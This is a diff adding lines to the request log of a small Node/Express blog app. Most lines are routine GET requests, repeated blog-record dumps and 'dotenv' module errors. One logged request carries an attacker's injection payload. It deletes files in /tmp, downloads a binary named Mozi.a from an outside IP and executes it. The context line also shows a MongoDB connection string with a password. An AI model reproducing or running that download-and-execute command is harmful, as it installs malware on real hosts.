@@ -1373,3 +1373,248 @@ Mongoose connected to mongodb://blogUser:password@localhost/blog
 ]
 [0mGET /api/blogs [32m200 [0m22.369 ms - 220[0m
 [0mGET /favicon.ico [36m304 [0m0.732 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.646 ms - -[0m
+[
+  {
+    _id: 5faa54e24e5e000d9f3f7fd1,
+    blog_title: 'test',
+    blog_text: '',
+    createdOn: 2020-11-10T08:52:50.023Z,
+    __v: 0
+  },
+  {
+    _id: 5faa5a6ced4a900dea2d8de5,
+    blog_title: 'test2',
+    blog_text: '',
+    createdOn: 2020-11-10T09:16:28.097Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m3.244 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.670 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.733 ms - -[0m
+[0mGET /currentsetting.htm [32m200 [0m0.963 ms - 6303[0m
+[0mGET / [36m304 [0m0.650 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.505 ms - -[0m
+[0mGET /bloggerApp.js [36m304 [0m0.503 ms - -[0m
+[0mGET /images/profile.jpg [36m304 [0m0.495 ms - -[0m
+[0mGET /images/bg3.jpg [36m304 [0m0.365 ms - -[0m
+[0mGET /favicon.ico [32m200 [0m1.508 ms - 6303[0m
+[0mGET /favicon.ico [36m304 [0m0.714 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.715 ms - -[0m
+[
+  {
+    _id: 5faa54e24e5e000d9f3f7fd1,
+    blog_title: 'test',
+    blog_text: '',
+    createdOn: 2020-11-10T08:52:50.023Z,
+    __v: 0
+  },
+  {
+    _id: 5faa5a6ced4a900dea2d8de5,
+    blog_title: 'test2',
+    blog_text: '',
+    createdOn: 2020-11-10T09:16:28.097Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.754 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.723 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.751 ms - -[0m
+[
+  {
+    _id: 5faa54e24e5e000d9f3f7fd1,
+    blog_title: 'test',
+    blog_text: '',
+    createdOn: 2020-11-10T08:52:50.023Z,
+    __v: 0
+  },
+  {
+    _id: 5faa5a6ced4a900dea2d8de5,
+    blog_title: 'test2',
+    blog_text: '',
+    createdOn: 2020-11-10T09:16:28.097Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.967 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.603 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.706 ms - -[0m
+[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://123.14.84.61:55902/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [32m200 [0m0.852 ms - 6303[0m
+[0mGET / [32m200 [0m0.719 ms - 6355[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.438 ms - -[0m
+[0mGET /bloggerApp.js [32m200 [0m0.661 ms - 7984[0m
+[0mGET /images/profile.jpg [36m304 [0m0.410 ms - -[0m
+[0mGET /images/bg3.jpg [36m304 [0m0.302 ms - -[0m
+[0mGET /favicon.ico [32m200 [0m0.788 ms - 6355[0m
+[0mGET /favicon.ico [36m304 [0m0.641 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.714 ms - -[0m
+[
+  {
+    _id: 5faa54e24e5e000d9f3f7fd1,
+    blog_title: 'test',
+    blog_text: '',
+    createdOn: 2020-11-10T08:52:50.023Z,
+    __v: 0
+  },
+  {
+    _id: 5faa5a6ced4a900dea2d8de5,
+    blog_title: 'test2',
+    blog_text: '',
+    createdOn: 2020-11-10T09:16:28.097Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.818 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.696 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.668 ms - -[0m
+[
+  {
+    _id: 5faa54e24e5e000d9f3f7fd1,
+    blog_title: 'test',
+    blog_text: '',
+    createdOn: 2020-11-10T08:52:50.023Z,
+    __v: 0
+  },
+  {
+    _id: 5faa5a6ced4a900dea2d8de5,
+    blog_title: 'test2',
+    blog_text: '',
+    createdOn: 2020-11-10T09:16:28.097Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.787 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.530 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.651 ms - -[0m
+[0mGET / [36m304 [0m0.540 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.725 ms - -[0m
+[0mGET /bloggerApp.js [36m304 [0m0.817 ms - -[0m
+[0mGET /images/profile.jpg [36m304 [0m0.324 ms - -[0m
+[0mGET /images/bg3.jpg [36m304 [0m0.315 ms - -[0m
+[0mGET /favicon.ico [32m200 [0m0.714 ms - 6355[0m
+[0mGET /favicon.ico [36m304 [0m0.645 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m2.163 ms - -[0m
+[
+  {
+    _id: 5faa54e24e5e000d9f3f7fd1,
+    blog_title: 'test',
+    blog_text: '',
+    createdOn: 2020-11-10T08:52:50.023Z,
+    __v: 0
+  },
+  {
+    _id: 5faa5a6ced4a900dea2d8de5,
+    blog_title: 'test2',
+    blog_text: '',
+    createdOn: 2020-11-10T09:16:28.097Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m3.178 ms - -[0m
+{
+  _id: 5faa54e24e5e000d9f3f7fd1,
+  blog_title: 'test',
+  blog_text: '',
+  createdOn: 2020-11-10T08:52:50.023Z,
+  __v: 0
+}
+[0mGET /api/blogs/5faa54e24e5e000d9f3f7fd1 [32m200 [0m7.911 ms - 116[0m
+[0mGET /favicon.ico [36m304 [0m0.520 ms - -[0m
+{
+  _id: 5faa54e24e5e000d9f3f7fd1,
+  blog_title: 'test',
+  blog_text: '',
+  createdOn: 2020-11-10T08:52:50.023Z,
+  __v: 0
+}
+[0mGET /api/blogs/5faa54e24e5e000d9f3f7fd1 [36m304 [0m2.149 ms - -[0m
+[
+  {
+    _id: 5faa54e24e5e000d9f3f7fd1,
+    blog_title: 'test',
+    blog_text: '',
+    createdOn: 2020-11-10T08:52:50.023Z,
+    __v: 0
+  },
+  {
+    _id: 5faa5a6ced4a900dea2d8de5,
+    blog_title: 'test2',
+    blog_text: '',
+    createdOn: 2020-11-10T09:16:28.097Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.615 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.591 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.682 ms - -[0m
+[0mGET /images/profile.jpg [36m304 [0m0.444 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.618 ms - -[0m
+[0mGET / [36m304 [0m0.541 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.410 ms - -[0m
+[0mGET /bloggerApp.js [36m304 [0m0.488 ms - -[0m
+[0mGET /images/profile.jpg [36m304 [0m0.419 ms - -[0m
+[0mGET /images/bg3.jpg [36m304 [0m0.360 ms - -[0m
+[0mGET /favicon.ico [32m200 [0m0.796 ms - 6355[0m
+[0mGET /favicon.ico [36m304 [0m0.635 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.625 ms - -[0m
+[
+  {
+    _id: 5faa54e24e5e000d9f3f7fd1,
+    blog_title: 'test',
+    blog_text: '',
+    createdOn: 2020-11-10T08:52:50.023Z,
+    __v: 0
+  },
+  {
+    _id: 5faa5a6ced4a900dea2d8de5,
+    blog_title: 'test2',
+    blog_text: '',
+    createdOn: 2020-11-10T09:16:28.097Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.450 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.662 ms - -[0m
+internal/modules/cjs/loader.js:969
+  throw err;
+  ^
+
+Error: Cannot find module 'dotenv'
+Require stack:
+- /home/bitnami/blog/app.js
+- /home/bitnami/blog/bin/www
+    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:966:15)
+    at Function.Module._load (internal/modules/cjs/loader.js:842:27)
+    at Module.require (internal/modules/cjs/loader.js:1026:19)
+    at require (internal/modules/cjs/helpers.js:72:18)
+    at Object.<anonymous> (/home/bitnami/blog/app.js:1:1)
+    at Module._compile (internal/modules/cjs/loader.js:1138:30)
+    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
+    at Module.load (internal/modules/cjs/loader.js:986:32)
+    at Function.Module._load (internal/modules/cjs/loader.js:879:14)
+    at Module.require (internal/modules/cjs/loader.js:1026:19) {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: [ '/home/bitnami/blog/app.js', '/home/bitnami/blog/bin/www' ]
+}
+internal/modules/cjs/loader.js:969
+  throw err;
+  ^
+
+Error: Cannot find module 'dotenv'
+Require stack:
+- /home/bitnami/blog/app.js
+- /home/bitnami/blog/bin/www
+    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:966:15)
+    at Function.Module._load (internal/modules/cjs/loader.js:842:27)
+    at Module.require (internal/modules/cjs/loader.js:1026:19)
+    at require (internal/modules/cjs/helpers.js:72:18)
+    at Object.<anonymous> (/home/bitnami/blog/app.js:1:1)
+    at Module._compile (internal/modules/cjs/loader.js:1138:30)
+    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
+    at Module.load (internal/modules/cjs/loader.js:986:32)
+    at Function.Module._load (internal/modules/cjs/loader.js:879:14)
+    at Module.require (internal/modules/cjs/loader.js:1026:19) {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: [ '/home/bitnami/blog/app.js', '/home/bitnami/blog/bin/www' ]
+}
